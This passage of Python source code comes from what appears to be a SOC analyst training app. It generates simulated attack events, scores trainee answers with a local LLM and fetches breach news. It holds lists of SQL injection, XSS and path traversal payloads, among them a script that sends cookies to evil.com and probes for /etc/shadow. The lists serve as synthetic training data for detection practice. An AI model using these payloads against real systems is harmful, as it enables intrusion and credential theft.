            "username":   e["username"],
            "ip":         e["ip"],
            "extra":      e["extra"],
            "created_at": e["created_at"],
        }
        for e in new_events
    ]

    return redirect(url_for("training_challenge", attempt_id=attempt_id))


@app.route("/training/challenge/<int:attempt_id>")
@analyst_required
def training_challenge(attempt_id):
    """Show the locked challenge page — events feed + 5 questions."""
    import json as _json
    analyst_id = session["user_id"]
    attempt = db_fetchone(
        f"SELECT * FROM training_attempts WHERE id = {PH} AND analyst_id = {PH}",
        (attempt_id, analyst_id),
    )
    if not attempt:
        abort(404)
    if attempt["submitted_at"]:
        return redirect(url_for("training_result", attempt_id=attempt_id))

    sc = TRAINING_SCENARIOS.get(attempt["scenario_name"], {})
    events = session.get("training_events", [])

    from mitre_reference import get_all_techniques
    all_mitre = get_all_techniques()

    # Unique IPs from the event feed (order-preserving) for the dropdown
    event_ips = list(dict.fromkeys(
        e["ip"] for e in events if e.get("ip")
    ))

    return render_template(
        "training_challenge.html",
        attempt=attempt,
        sc=sc,
        events=events,
        all_mitre=all_mitre,
        event_ips=event_ips,
    )


@app.route("/training/challenge/<int:attempt_id>/submit", methods=["POST"])
@analyst_required
def training_submit(attempt_id):
    """Score the submission and unlock the report."""
    import json as _json
    analyst_id = session["user_id"]
    attempt = db_fetchone(
        f"SELECT * FROM training_attempts WHERE id = {PH} AND analyst_id = {PH}",
        (attempt_id, analyst_id),
    )
    if not attempt:
        abort(404)
    if attempt["submitted_at"]:
        return redirect(url_for("training_result", attempt_id=attempt_id))

    # Collect answers
    ans_tech      = request.form.get("answer_techniques", "").strip()
    ans_ip        = request.form.get("answer_ip", "").strip()
    ans_succeeded = request.form.get("answer_succeeded", "").strip()
    ans_iocs      = request.form.get("answer_iocs", "").strip()
    ans_response  = request.form.get("answer_response", "").strip()

    # Strict mode: all five answers required
    missing = [f for f, v in [
        ("MITRE techniques", ans_tech), ("Attacker IP", ans_ip),
        ("Attack succeeded?", ans_succeeded), ("IOCs", ans_iocs),
        ("Response action", ans_response),
    ] if not v]
    if missing:
        flash(f"Please answer all questions before submitting: {', '.join(missing)}", "danger")
        return redirect(url_for("training_challenge", attempt_id=attempt_id))

    sc               = TRAINING_SCENARIOS.get(attempt["scenario_name"], {})
    actual_techs     = _json.loads(attempt["actual_techniques"])
    actual_ip        = attempt["actual_attacker_ip"]
    actual_succeeded = bool(attempt["actual_succeeded"])

    # ── Rule-based scoring ────────────────────────────────────────────────────

    # Techniques (0-5): proportion of correct IDs mentioned
    ans_upper   = ans_tech.upper()
    correct_ids = [t for t in actual_techs if t.upper() in ans_upper]
    ratio       = len(correct_ids) / max(len(actual_techs), 1)
    score_tech  = round(ratio * 5)

    # IP (0 or 5)
    score_ip = 5 if actual_ip and actual_ip in ans_ip else 0

    # Succeeded (0 or 5)
    ans_succ_lower = ans_succeeded.lower()
    if actual_succeeded:
        score_succ = 5 if any(w in ans_succ_lower for w in ("yes", "succeed", "true", "did", "compromised", "breached")) else 0
    else:
        score_succ = 5 if any(w in ans_succ_lower for w in ("no", "fail", "false", "didn", "not succeed", "blocked", "prevented")) else 0

    # ── AI scoring via Ollama ─────────────────────────────────────────────────
    fb_iocs = fb_response = fb_overall = ""
    score_iocs = score_resp = 3  # safe default if Ollama unavailable

    ai_prompt = f"""You are a senior cybersecurity trainer evaluating a SOC analyst student at Boundry.AI.

SCENARIO: {sc.get('label', attempt['scenario_label'])}
ACTUAL MITRE TECHNIQUES: {', '.join(actual_techs)}
ACTUAL ATTACKER IP: {actual_ip}
ATTACK SUCCEEDED: {'Yes' if actual_succeeded else 'No'}

STUDENT ANSWERS:
Q4 — IOC Identification: "{ans_iocs}"
Q5 — Incident Response Plan: "{ans_response}"

Score each answer 0-5 using this scale:
5 = Complete, accurate, professional-grade answer
4 = Mostly correct, minor gaps
3 = Partially correct, key points present but incomplete
2 = Some understanding but significant gaps
1 = Minimal correct content
0 = Incorrect or empty

Return ONLY valid JSON, no other text:
{{
  "score_iocs": <integer 0-5>,
  "feedback_iocs": "<1-2 sentences of specific feedback>",
  "score_response": <integer 0-5>,
  "feedback_response": "<1-2 sentences of specific feedback>",
  "overall_feedback": "<2-3 sentences: what they did well, what to focus on next>"
}}"""

    try:
        import json as _j
        import urllib.request as _urlreq
        ollama_base  = os.environ.get("OLLAMA_BASE_URL", "http://localhost:11434/v1")
        ollama_model = os.environ.get("OLLAMA_MODEL", "llama3.1:8b")
        payload = _j.dumps({
            "model": ollama_model,
            "messages": [{"role": "user", "content": ai_prompt}],
            "max_tokens": 512,
            "temperature": 0.2,
        }).encode()
        req = _urlreq.Request(
            f"{ollama_base}/chat/completions",
            data=payload,
            headers={"Content-Type": "application/json"},
        )
        with _urlreq.urlopen(req, timeout=60) as resp:
            raw    = _j.loads(resp.read())
            text   = raw["choices"][0]["message"]["content"].strip()
            # Strip any markdown code fences if present
            text   = re.sub(r"^```[a-z]*\n?", "", text).rstrip("`").strip()
            scored = _j.loads(text)
            score_iocs  = max(0, min(5, int(scored.get("score_iocs",  3))))
            score_resp  = max(0, min(5, int(scored.get("score_response", 3))))
            fb_iocs     = scored.get("feedback_iocs", "")
            fb_response = scored.get("feedback_response", "")
            fb_overall  = scored.get("overall_feedback", "")
    except Exception as exc:
        security_log.warning(f"TRAINING_AI_SCORE_FAILED error={exc}")
        fb_overall = "AI scoring unavailable — scores for Q4 and Q5 are estimated."

    score_total = score_tech + score_ip + score_succ + score_iocs + score_resp

    # Persist results
    db_run(
        f"UPDATE training_attempts SET "
        f"submitted_at={PH}, answer_techniques={PH}, answer_ip={PH}, "
        f"answer_succeeded={PH}, answer_iocs={PH}, answer_response={PH}, "
        f"score_techniques={PH}, score_ip={PH}, score_succeeded={PH}, "
        f"score_iocs={PH}, score_response={PH}, score_total={PH}, "
        f"ai_feedback_iocs={PH}, ai_feedback_response={PH}, ai_feedback_overall={PH} "
        f"WHERE id={PH}",
        (
            datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S"),
            ans_tech, ans_ip, ans_succeeded, ans_iocs, ans_response,
            score_tech, score_ip, score_succ, score_iocs, score_resp, score_total,
            fb_iocs, fb_response, fb_overall,
            attempt_id,
        ),
    )
    # Clear events from session
    session.pop("training_events", None)
    return redirect(url_for("training_result", attempt_id=attempt_id))


@app.route("/training/result/<int:attempt_id>")
@analyst_required
def training_result(attempt_id):
    """Show scores, AI feedback, and the now-unlocked incident report."""
    import json as _json
    analyst_id = session["user_id"]
    attempt = db_fetchone(
        f"SELECT * FROM training_attempts WHERE id = {PH} AND analyst_id = {PH}",
        (attempt_id, analyst_id),
    )
    if not attempt:
        abort(404)
    if not attempt["submitted_at"]:
        return redirect(url_for("training_challenge", attempt_id=attempt_id))

    report = None
    if attempt["report_id"]:
        report = db_fetchone(
            f"SELECT id, created_at, threat_count, event_count, content FROM reports WHERE id = {PH}",
            (attempt["report_id"],),
        )
        if report:
            report = dict(report)
            report["content_html"] = Markup(markdown.markdown(
                report["content"],
                extensions=["tables", "fenced_code"],
            ))

    actual_techniques = _json.loads(attempt["actual_techniques"] or "[]")
    sc = TRAINING_SCENARIOS.get(attempt["scenario_name"], {})
    return render_template(
        "training_result.html",
        attempt=attempt,
        sc=sc,
        report=report,
        actual_techniques=actual_techniques,
    )


# --- ROUTE 4b: Analyst Control Room ---
@app.route("/control-room")
@analyst_required
def control_room():
    """
    Internal analyst dashboard — only accessible to accounts with role='analyst'.
    Shows all clients, all reports, system stats, and quick action controls.
    Trust boundary: analyst_required enforces role check (A01).
    """
    clients     = db_fetchall("SELECT id, username, role FROM users ORDER BY username ASC")
    all_reports = db_fetchall(
        "SELECT r.id, r.created_at, r.threat_count, r.event_count, r.status, "
        "u.username AS owner_username "
        "FROM reports r LEFT JOIN users u ON r.owner_id = u.id "
        "ORDER BY r.id DESC"
    )
    pending_row   = db_fetchone(f"SELECT COUNT(*) AS cnt FROM security_events WHERE processed = {PH}", (0,))
    pending_count = pending_row["cnt"] if pending_row else 0

    # Live event feed — last 100 events (processed + pending) for the analyst feed panel
    recent_events = db_fetchall(
        "SELECT id, created_at, event_type, username, ip, extra, processed "
        "FROM security_events ORDER BY id DESC LIMIT 100"
    )

    # Summary stats for the header bar
    total_clients = len([c for c in clients if c["role"] == "client"])
    total_reports = len(all_reports)
    total_threats = sum(r["threat_count"] for r in all_reports)
    total_events  = sum(r["event_count"]  for r in all_reports)

    # Breach intel — last 30 non-dismissed items for the ticker + panel, newest first
    breach_items = db_fetchall(
        "SELECT id, created_at, title, source, url, summary, severity "
        "FROM breach_intel WHERE dismissed = 0 ORDER BY id DESC LIMIT 30"
    )
    # Archived items — always shown in the archive panel regardless of dismissed flag
    archived_items = db_fetchall(
        "SELECT id, created_at, title, source, url, summary, severity "
        "FROM breach_intel WHERE archived = 1 ORDER BY id DESC LIMIT 50"
    )
    last_intel_update = breach_items[0]["created_at"] if breach_items else (
        archived_items[0]["created_at"] if archived_items else None
    )

    # CISSP domain progress for the Control Room CISSP panel
    analyst_id     = session["user_id"]
    cissp_progress_rows = db_fetchall(
        f"SELECT domain_num, attempts, correct FROM cissp_progress WHERE analyst_id = {PH}",
        (analyst_id,),
    )
    cissp_progress = {r["domain_num"]: r for r in cissp_progress_rows}
    readiness_score = _cissp_readiness_score(analyst_id)

    # Real system findings — unresolved, newest first
    open_findings = db_fetchall(
        "SELECT id, finding_id, title, severity, cissp_domain, category, description, "
        "recommendation, scan_type, created_at FROM system_findings "
        "WHERE resolved = 0 ORDER BY id DESC LIMIT 50"
    )
    resolved_findings_count = (db_fetchone("SELECT COUNT(*) AS cnt FROM system_findings WHERE resolved = 1") or {}).get("cnt", 0)
    total_findings_count    = (db_fetchone("SELECT COUNT(*) AS cnt FROM system_findings") or {}).get("cnt", 0)

    player = get_player_profile(analyst_id)

    return render_template(
        "control_room.html",
        clients=clients,
        reports=all_reports,
        pending_count=pending_count,
        recent_events=recent_events,
        total_clients=total_clients,
        total_reports=total_reports,
        total_threats=total_threats,
        total_events=total_events,
        breach_items=breach_items,
        archived_items=archived_items,
        last_intel_update=last_intel_update,
        cissp_domains=CISSP_DOMAINS,
        cissp_progress=cissp_progress,
        readiness_score=readiness_score,
        open_findings=open_findings,
        resolved_findings_count=resolved_findings_count,
        total_findings_count=total_findings_count,
        player=player,
    )


# ── Shared business logic (used by browser routes AND cron) ──────────────────

def _fetch_breach_intel():
    """
    Pull the latest breach/incident reports from security RSS feeds.
    Filters for breach-relevant items, then uses Claude to triage and summarise
    the top 8 most significant ones.  Saves new items to the breach_intel table
    (deduplicates by URL so repeated runs don't create duplicates).
    Returns the number of new items saved.
    """
    import feedparser as _fp
    import json as _json

    FEEDS = [
        ("The Hacker News",   "https://feeds.feedburner.com/TheHackersNews"),
        ("BleepingComputer",  "https://www.bleepingcomputer.com/feed/"),
        ("Krebs on Security", "https://krebsonsecurity.com/feed/"),
        ("DataBreaches.net",  "https://www.databreaches.net/feed/"),
    ]

    BREACH_KEYWORDS = [
        "breach", "leak", "hack", "ransomware", "stolen", "exposed",
        "compromised", "credentials", "phishing", "malware", "zero-day",
        "vulnerability", "CVE", "attack", "exploit", "data theft",
    ]

    # Collect relevant items from all feeds
    raw_items = []
    for source_name, feed_url in FEEDS:
        try:
            feed = _fp.parse(feed_url)
            for entry in feed.entries[:12]:
                title   = entry.get("title",   "")
                summary = entry.get("summary", entry.get("description", ""))
                url     = entry.get("link",    "")
                content = (title + " " + summary).lower()
                if any(kw in content for kw in BREACH_KEYWORDS):
                    raw_items.append({
                        "source":  source_name,
                        "title":   title[:200],
                        "summary": re.sub(r"<[^>]+>", "", summary)[:400],  # strip HTML tags
                        "url":     url[:500],
                    })
        except Exception as exc:
            security_log.warning(f"BREACH_INTEL_FEED_ERROR source={source_name} error={exc}")

    if not raw_items:
        return 0

    # Deduplicate against URLs already in the DB
    existing_urls = {r["url"] for r in db_fetchall("SELECT url FROM breach_intel")}
    new_items = [i for i in raw_items if i["url"] not in existing_urls]
    if not new_items:
        return 0

    api_key = os.environ.get("ANTHROPIC_API_KEY")
    saved   = 0

    if api_key:
        try:
            import anthropic as _anthropic
            prompt = (
                "You are a threat intelligence analyst reviewing security news.\n\n"
                "From the list below, identify the 8 most significant items that a SOC "
                "(Security Operations Centre) team should know about — real breaches, "
                "active ransomware campaigns, critical zero-days, or major credential leaks. "
                "Skip opinion pieces, product launches, and minor advisories.\n\n"
                f"Items:\n{_json.dumps(new_items[:25], indent=2)}\n\n"
                "Respond with ONLY a JSON array (no other text). Each object must have:\n"
                "  title    — original title, max 120 chars\n"
                "  source   — news source name\n"
                "  url      — original URL\n"
                "  summary  — one plain-English sentence: who was hit, what was taken, "
                "scale if known. Max 140 chars.\n"
                "  severity — HIGH (millions of records / critical infra / active exploitation), "
                "MEDIUM (confirmed breach, limited scope), or LOW (advisory / patched)."
            )
            client  = _anthropic.Anthropic(api_key=api_key)
            message = client.messages.create(
                model="claude-haiku-4-5",
                max_tokens=1200,
                messages=[{"role": "user", "content": prompt}],
            )
            text       = message.content[0].text.strip()
            # Claude sometimes wraps the JSON in a code fence — strip it
            text       = re.sub(r"^```[a-z]*\n?", "", text)
            text       = re.sub(r"\n?```$",       "", text).strip()
            intel_list = _json.loads(text)
            for item in intel_list[:8]:
                db_run(
                    f"INSERT INTO breach_intel (title, source, url, summary, severity)"
                    f" VALUES ({PH},{PH},{PH},{PH},{PH})",
                    (
                        str(item.get("title",   ""))[:200],
                        str(item.get("source",  ""))[:100],
                        str(item.get("url",     ""))[:500],
                        str(item.get("summary", ""))[:300],
                        str(item.get("severity","MEDIUM")).upper()[:10],
                    ),
                )
                saved += 1
        except Exception as exc:
            security_log.warning(f"BREACH_INTEL_AI_ERROR {exc}")
            # Fallback: save raw items without AI curation
            for item in new_items[:8]:
                db_run(
                    f"INSERT INTO breach_intel (title, source, url, summary, severity)"
                    f" VALUES ({PH},{PH},{PH},{PH},{PH})",
                    (item["title"], item["source"], item["url"], item["summary"], "MEDIUM"),
                )
                saved += 1
    else:
        # No API key — save raw items directly
        for item in new_items[:8]:
            db_run(
                f"INSERT INTO breach_intel (title, source, url, summary, severity)"
                f" VALUES ({PH},{PH},{PH},{PH},{PH})",
                (item["title"], item["source"], item["url"], item["summary"], "MEDIUM"),
            )
            saved += 1

    security_log.info(f"BREACH_INTEL_FETCH new_items={saved}")
    return saved


def _simulate_attack_core(owner_id=None, difficulty="medium", chain=None, scenario=None):
    """
    Generate a randomised attack scenario and write events to the DB.
    difficulty: "easy" | "medium" | "hard"
    - easy:   single obvious attack type, no false positives
    - medium: realistic multi-event scenarios, varied techniques
    - hard:   subtle patterns, false positives mixed in, multi-vector

    chain: named multi-stage APT scenario (overrides difficulty if set)
    - "recon_to_takeover"  Enumeration → Stuffing → Account Takeover → Priv Esc
    - "web_exploit_chain"  Brute Force → Login → SQL Injection → Traversal
    - "stealthy_apt"       Password Spray → Suspicious Login → XSS → Priv Esc

    owner_id tags events to a specific client (None = cron/system).
    Returns the number of events generated.
    """
    import random

    # TEST-NET ranges (RFC 5737) — documentation-only IPs
    ATTACKER_IPS  = ["203.0.113.42","203.0.113.99","198.51.100.17","198.51.100.88","192.0.2.55"]
    USERNAMES     = ["admin","administrator","root","user","test","support","guest","operator"]
    LEGIT_USERS   = ["alice","bob","charlie","diana","eve"]

    SQL_PAYLOADS  = [
        "' OR '1'='1", "' UNION SELECT username, password FROM users--",
        "'; DROP TABLE users;--", "' AND 1=1--", "1' OR '1'='1' /*", "' OR 1=1--",
        "' OR 'x'='x", "admin'--",
    ]
    XSS_PAYLOADS  = [
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
        "javascript:alert(document.cookie)", "<svg onload=alert(1)>",
        "'\"><script>fetch('https://evil.com?c='+document.cookie)</script>",
    ]
    TRAVERSAL_PATHS = [
        "../../etc/passwd", "../../../etc/shadow", "..%2F..%2Fetc%2Fpasswd",
        "....//....//etc/passwd", "%2e%2e%2fetc%2fpasswd",
    ]
    PRIV_ESC_ROUTES = ["/admin", "/control-room", "/api/users", "/api/admin", "/.env", "/config"]
    SPRAY_PASSWORDS = ["Password1!", "Summer2024!", "Welcome1!", "Company123!", "Admin@2024"]

    ip      = random.choice(ATTACKER_IPS)
    target  = random.choice(USERNAMES)
    legit   = random.choice(LEGIT_USERS)

    def insert(event_type, username, ip, extra=""):
        db_run(
            f"INSERT INTO security_events (event_type, username, ip, extra, owner_id)"
            f" VALUES ({PH},{PH},{PH},{PH},{PH})",
            (event_type, username, ip, extra, owner_id),
        )

    # ── SCENARIO LIBRARY ─────────────────────────────────────────────────────

    def scenario_brute_force():
        """Classic brute force — repeated login failures then success. T1110"""
        for _ in range(random.randint(5, 8)):
            insert("LOGIN_FAILED", target, ip)
        insert("LOGIN_SUCCESS", target, ip)

    def scenario_sql_injection():
        """SQL injection attempts via search/input fields. T1190"""
        insert("LOGIN_SUCCESS", legit, "10.0.0.1")  # legitimate baseline
        for p in random.sample(SQL_PAYLOADS, random.randint(2, 4)):
            insert("SEARCH", target, ip, p)

    def scenario_xss_attack():
        """Cross-site scripting payloads submitted via input fields. T1059.007"""
        insert("LOGIN_SUCCESS", legit, "10.0.0.2")  # baseline
        for p in random.sample(XSS_PAYLOADS, random.randint(2, 3)):
            insert("XSS_ATTEMPT", target, ip, p)

    def scenario_directory_traversal():
        """Attacker probing filesystem via path traversal. T1083"""
        for path in random.sample(TRAVERSAL_PATHS, random.randint(3, 5)):
            insert("DIRECTORY_TRAVERSAL", target, ip, path)

    def scenario_credential_stuffing():
        """Same IP, many different accounts — leaked credential list. T1110.004"""
        victims = random.sample(USERNAMES, random.randint(4, 6))
        for v in victims:
            insert("LOGIN_FAILED", v, ip)
            insert("LOGIN_FAILED", v, ip)
        # One account was in the breach — gets in
        insert("LOGIN_SUCCESS", random.choice(victims), ip)

    def scenario_password_spray():
        """One common password tried across many accounts. T1110.003
        Hard to detect — low failure count per account."""
        password = random.choice(SPRAY_PASSWORDS)
        victims = random.sample(USERNAMES, random.randint(5, 7))
        for v in victims:
            insert("LOGIN_FAILED", v, ip, f"sprayed_password={password}")

    def scenario_privilege_escalation():
        """Logged-in user probing restricted routes. T1548"""
        insert("LOGIN_SUCCESS", legit, ip)
        for route in random.sample(PRIV_ESC_ROUTES, random.randint(3, 5)):
            insert("PRIV_ESC_ATTEMPT", legit, ip, route)

    def scenario_account_enumeration():
        """Probing which usernames exist via login response timing. T1589.001"""
        probed = random.sample(USERNAMES + LEGIT_USERS, random.randint(6, 8))
        for u in probed:
            insert("ACCOUNT_ENUM", u, ip)

    def scenario_suspicious_login():
        """Legitimate account logs in from unusual IP/time — could be account takeover. T1078"""
        insert("LOGIN_SUCCESS", legit, ip, "new_ip=true unusual_hour=true")
        for route in random.sample(PRIV_ESC_ROUTES[:3], 2):
            insert("PRIV_ESC_ATTEMPT", legit, ip, route)

    # False positive events (look suspicious, are benign)
    def add_false_positives():
        fp_ip = random.choice(["10.0.0.10", "10.0.0.11", "172.16.0.5"])
        # Legitimate user mistyped password twice — not brute force
        insert("LOGIN_FAILED", legit, fp_ip)
        insert("LOGIN_FAILED", legit, fp_ip)
        insert("LOGIN_SUCCESS", legit, fp_ip)
        # Legitimate search with SQL-like word (e.g. "SELECT all items")
        insert("SEARCH", legit, fp_ip, "SELECT all items from last month")

    # ── APT CHAIN SCENARIOS ───────────────────────────────────────────────────
    # Each chain fires events in a logical kill-chain order so the AI report
    # can identify the full attack progression, not just isolated incidents.

    def chain_recon_to_takeover():
        """Reconnaissance → Credential Access → Account Takeover → Persistence
        T1589.001 → T1110.004 → T1078 → T1548
        The classic APT entry pattern: find valid usernames, use a breach list,
        get in, then immediately try to escalate privileges."""
        # Phase 1 — Reconnaissance: probe for valid usernames
        probed = random.sample(USERNAMES + LEGIT_USERS, random.randint(6, 8))
        for u in probed:
            insert("ACCOUNT_ENUM", u, ip)
        # Phase 2 — Credential stuffing using discovered usernames
        for v in probed[:random.randint(4, 6)]:
            insert("LOGIN_FAILED", v, ip)
        # Phase 3 — One account was in the breach database
        compromised = random.choice(LEGIT_USERS)
        insert("LOGIN_SUCCESS", compromised, ip)
        # Phase 4 — Immediately attempt privilege escalation
        for route in random.sample(PRIV_ESC_ROUTES, random.randint(3, 4)):
            insert("PRIV_ESC_ATTEMPT", compromised, ip, route)

    def chain_web_exploit_chain():
        """Initial Access → Execution → Discovery → Collection
        T1110 → T1078 → T1059.007 → T1190 → T1083
        Attacker forces their way in via brute force, then methodically
        probes for data extraction vectors."""
        # Phase 1 — Brute force the login
        for _ in range(random.randint(7, 12)):
            insert("LOGIN_FAILED", target, ip)
        # Phase 2 — Break in
        insert("LOGIN_SUCCESS", target, ip)
        # Phase 3 — XSS probing (trying to plant a persistent payload)
        for p in random.sample(XSS_PAYLOADS, random.randint(2, 3)):
            insert("XSS_ATTEMPT", target, ip, p)
        # Phase 4 — SQL injection (trying to extract the database)
        for p in random.sample(SQL_PAYLOADS, random.randint(3, 4)):
            insert("SEARCH", target, ip, p)
        # Phase 5 — Directory traversal (hunting for config files)
        for path in random.sample(TRAVERSAL_PATHS, random.randint(2, 4)):
            insert("DIRECTORY_TRAVERSAL", target, ip, path)

    def chain_stealthy_apt():
        """Credential Access → Initial Access → Execution → Privilege Escalation
        T1110.003 → T1078 → T1059.007 → T1548
        Low-and-slow attack designed to evade detection. Password spray keeps
        failure counts per account below lockout thresholds. Once in, the
        attacker moves carefully — probing before striking."""
        # Phase 1 — Slow password spray (1 attempt per account, looks like typos)
        password = random.choice(SPRAY_PASSWORDS)
        spray_targets = random.sample(USERNAMES + LEGIT_USERS, random.randint(6, 9))
        for v in spray_targets:
            insert("LOGIN_FAILED", v, ip, f"sprayed_password={password}")
        # Phase 2 — One account had that exact password (it was in a previous breach)
        entry_account = random.choice(LEGIT_USERS)
        insert("LOGIN_SUCCESS", entry_account, ip, "new_ip=true unusual_hour=true")
        # Phase 3 — Quiet reconnaissance: XSS to steal session cookies
        for p in random.sample(XSS_PAYLOADS, 2):
            insert("XSS_ATTEMPT", entry_account, ip, p)
        # Phase 4 — Escalation attempt once the lay of the land is known
        for route in random.sample(PRIV_ESC_ROUTES, random.randint(4, 6)):
            insert("PRIV_ESC_ATTEMPT", entry_account, ip, route)

    APT_CHAINS = {
        "recon_to_takeover": chain_recon_to_takeover,
        "web_exploit_chain": chain_web_exploit_chain,
        "stealthy_apt":      chain_stealthy_apt,
    }

    # ── DIFFICULTY POOLS ─────────────────────────────────────────────────────
    easy_scenarios = [
        scenario_brute_force,
        scenario_sql_injection,
        scenario_directory_traversal,
    ]
    medium_scenarios = [
        scenario_brute_force,
        scenario_sql_injection,
        scenario_xss_attack,
        scenario_credential_stuffing,
        scenario_directory_traversal,
        scenario_account_enumeration,
    ]
    hard_scenarios = [
        scenario_password_spray,
        scenario_privilege_escalation,
        scenario_suspicious_login,
        scenario_credential_stuffing,
    ]

    SCENARIO_MAP = {
        "brute_force":          scenario_brute_force,
        "sql_injection":        scenario_sql_injection,
        "xss_attack":           scenario_xss_attack,
        "directory_traversal":  scenario_directory_traversal,
        "credential_stuffing":  scenario_credential_stuffing,
        "password_spray":       scenario_password_spray,
        "privilege_escalation": scenario_privilege_escalation,
        "account_enumeration":  scenario_account_enumeration,
        "suspicious_login":     scenario_suspicious_login,
    }

    if chain and chain in APT_CHAINS:
        APT_CHAINS[chain]()
    elif scenario and scenario in SCENARIO_MAP:
        SCENARIO_MAP[scenario]()
    elif difficulty == "easy":
        chosen = random.choice(easy_scenarios)
        chosen()
    elif difficulty == "hard":
        # Multi-vector: two scenarios + false positives
        chosen = random.sample(hard_scenarios, 2)
        for s in chosen: s()
        add_false_positives()
    else:  # medium (default)
        chosen = random.choice(medium_scenarios)
        chosen()

    # Return count of events generated
    return db_fetchone(
        f"SELECT COUNT(*) AS cnt FROM security_events WHERE processed = {PH} AND owner_id {'= ' + PH if owner_id is not None else 'IS NULL'}",
        (0, owner_id) if owner_id is not None else (0,),
    )["cnt"]


def _lookup_ip_reputation(ip):
    """
    Query AbuseIPDB for a single IP address.
    Returns a dict with reputation data, or None if the key is not configured
    or the lookup fails.

    Free tier: 1,000 checks/day. Simulated TEST-NET IPs (203.0.113.x etc.)
    will return 0 reports — that is expected and correct for RFC 5737 addresses.
    Real attacker IPs from the /api/ingest route will return live data.
    """
    api_key = os.environ.get("ABUSEIPDB_API_KEY", "").strip()
    if not api_key:
        return None
    try:
        import requests as _req
        resp = _req.get(
            "https://api.abuseipdb.com/api/v2/check",
            headers={"Key": api_key, "Accept": "application/json"},
            params={"ipAddress": ip, "maxAgeInDays": 90},
            timeout=5,
        )
        if resp.status_code == 200:
            d = resp.json().get("data", {})
            return {
                "ip":                    d.get("ipAddress", ip),
                "abuse_score":           d.get("abuseConfidenceScore", 0),   # 0–100
                "total_reports":         d.get("totalReports", 0),
                "country":               d.get("countryCode", "??"),
                "isp":                   d.get("isp", "Unknown"),
                "usage_type":            d.get("usageType", "Unknown"),
                "last_reported":         d.get("lastReportedAt", None),
                "is_tor":                d.get("isTor", False),
                "is_public":             d.get("isPublic", True),
            }
    except Exception:
        pass
    return None


def _enrich_threats_with_ip_reputation(threats):
    """
    For each unique attacker IP in the threat list, fetch AbuseIPDB reputation
    and attach it to every threat that shares that IP.
    Deduplicates API calls — each IP is looked up at most once.
    """
    unique_ips = {t.get("ip") for t in threats if t.get("ip")}
    reputation_cache = {}
    for ip in unique_ips:
        rep = _lookup_ip_reputation(ip)
        if rep:
            reputation_cache[ip] = rep

    if not reputation_cache:
        return threats  # No API key or all lookups failed — return unmodified

    for threat in threats:
        ip = threat.get("ip")
        if ip and ip in reputation_cache:
            threat["ip_reputation"] = reputation_cache[ip]
    return threats


def _generate_report_with_ai(prompt):
    """
    Generate an AI incident report. Priority order:
      1. Local Ollama  — 100% private, runs on your GPU (preferred for Boundry.AI)
      2. Anthropic Claude — cloud fallback only if ANTHROPIC_API_KEY is set
    Returns the report text string, or None if both backends are unavailable.
    Controlled by env vars:
      OLLAMA_BASE_URL  (default: http://localhost:11434/v1)
      OLLAMA_MODEL     (default: llama3.1:8b)
    """
    import json as _j
    import urllib.request as _urlreq

    # --- 1. Local Ollama (zero cloud, zero cost) ---
    ollama_base  = os.environ.get("OLLAMA_BASE_URL", "http://localhost:11434/v1")
    ollama_model = os.environ.get("OLLAMA_MODEL",    "llama3.1:8b")
    try:
        payload = _j.dumps({
            "model":       ollama_model,
            "messages":    [{"role": "user", "content": prompt}],
            "max_tokens":  2048,
            "temperature": 0.3,
        }).encode()
        req = _urlreq.Request(
            f"{ollama_base}/chat/completions",
            data=payload,
            headers={"Content-Type": "application/json"},
        )
        with _urlreq.urlopen(req, timeout=120) as resp:
            data = _j.loads(resp.read())
            text = data["choices"][0]["message"]["content"].strip()
            security_log.info(f"REPORT_AI_BACKEND backend=ollama model={ollama_model}")
            return text
    except Exception as exc:
        security_log.warning(f"REPORT_OLLAMA_FAILED error={exc}")

    # --- 2. Anthropic Claude (cloud fallback) ---
    api_key = os.environ.get("ANTHROPIC_API_KEY", "").strip()
    if api_key:
        try:
            import anthropic as _anthropic
            ai_client = _anthropic.Anthropic(api_key=api_key)
            message   = ai_client.messages.create(
                model="claude-opus-4-5", max_tokens=1024,
                messages=[{"role": "user", "content": prompt}],
            )
            security_log.info("REPORT_AI_BACKEND backend=anthropic")
            return message.content[0].text.strip()
        except Exception as exc:
            security_log.warning(f"REPORT_ANTHROPIC_FAILED error={exc}")

    return None  # Both backends unavailable


def _run_agent_core(triggered_by="unknown", owner_id=None):
    """
    Read events, detect threats, generate and save a report.
    owner_id scopes events and the saved report to a specific client.
    None = system/cron run (processes all unowned events, report visible to analyst only).
    Called by /run-agent (browser) and /cron/run (automated).
    Returns a dict: {status, threats_found, event_count, report_id, message}.
    """
    import json as _json
    from collections import defaultdict

    log_path = Path(os.environ.get("LOG_FILE", "")) if os.environ.get("LOG_FILE") else None

    events = {
        "login_failed": [], "login_success": [], "search": [], "register": [],
        "xss_attempt": [], "directory_traversal": [], "priv_esc_attempt": [],
        "account_enum": [],
    }

    # Source 1: log file (local dev with LOG_FILE set)
    if log_path and log_path.exists():
        import re as _re
        pattern = _re.compile(
            r"(?P<timestamp>\S+)\s+(?P<level>\w+)\s+(?P<event>\w+)\s+(?P<fields>.*)"
        )
        with open(log_path) as fh:
            for line in fh:
                line = line.strip()
                if not any(kw in line for kw in ["LOGIN", "SEARCH", "REGISTER"]):
                    continue
                m = pattern.match(line)
                if not m:
                    continue
                event_type = m.group("event").lower()
                fields     = m.group("fields")
                record     = {"timestamp": m.group("timestamp"), "raw": line}
                for match in _re.finditer(r'(\w+)=("[^"]*"|\'[^\']*\'|\S+)', fields):
                    key, val = match.group(1), match.group(2).strip("'\"")
                    record[key] = val
                if   event_type == "login_failed":    events["login_failed"].append(record)
                elif event_type == "login_success":   events["login_success"].append(record)
                elif event_type == "search":          events["search"].append(record)
                elif event_type == "register_success":events["register"].append(record)

    # Source 2: DB security_events table (production / Railway path)
    # Scope to owner_id — each client only processes their own events.
    if owner_id is not None:
        db_rows = db_fetchall(
            f"SELECT * FROM security_events WHERE processed = {PH} AND owner_id = {PH} ORDER BY id ASC",
            (0, owner_id),
        )
    else:
        db_rows = db_fetchall(
            f"SELECT * FROM security_events WHERE processed = {PH} AND owner_id IS NULL ORDER BY id ASC",
            (0,),
        )
    for row in db_rows:
        record = {
            "timestamp": str(row["created_at"]),
            "username":  row["username"],
            "ip":        row["ip"],
            "extra":     row.get("extra", ""),
        }
        etype = row["event_type"].upper()
        if   etype == "LOGIN_FAILED":
            events["login_failed"].append(record)
        elif etype == "LOGIN_SUCCESS":
            events["login_success"].append(record)
        elif etype == "SEARCH":
            record["query"] = row["extra"]
            events["search"].append(record)
        elif etype == "REGISTER_SUCCESS":
